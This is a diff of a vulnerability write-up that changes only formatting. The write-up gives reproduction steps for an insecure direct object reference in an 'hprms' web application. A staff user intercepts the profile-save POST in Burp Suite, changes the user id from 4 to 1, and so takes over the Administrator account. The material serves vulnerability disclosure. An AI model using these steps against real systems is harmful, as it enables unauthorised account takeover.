@@ -19,11 +19,9 @@ An attacker can takeover the Administrator's account
 ## Steps of reproduce:
 Note: in this case, we used two users, user1 as a staff with user id '4', and admin as an Administrator with user id '1'.
 
-Step-1: Log in to the application using user1 account,then on the dashboard navigate to 'My Account'
+- Step-1: Log in to the application using user1 account,then on the dashboard navigate to 'My Account' -> http://localhost/hprms/admin/?page=user
 
-http://localhost/hprms/admin/?page=user
-
-Step-2: Modify the username,lastname and password,then let's intercept the request using burpsuite:
+- Step-2: Modify the username,lastname and password,then let's intercept the request using burpsuite:
 ```html
 POST /hprms/classes/Users.php?f=save HTTP/1.1
 Host: localhost
@@ -69,7 +67,7 @@ Content-Type: application/octet-stream
 
 -----------------------------17632878732301879013646251239--
 ```
-Step-3: Change parameter id '4' to id '1'
+- Step-3: Change parameter id '4' to id '1'
 ```html
 POST /hprms/classes/Users.php?f=save HTTP/1.1
 Host: localhost
@@ -115,4 +113,4 @@ Content-Type: application/octet-stream
 
 -----------------------------17632878732301879013646251239--
 ```
-step-4: Click 'Forward' on burpsuite. Now user1 is a Administrator.
+- step-4: Click 'Forward' on burpsuite. Now user1 is a Administrator.
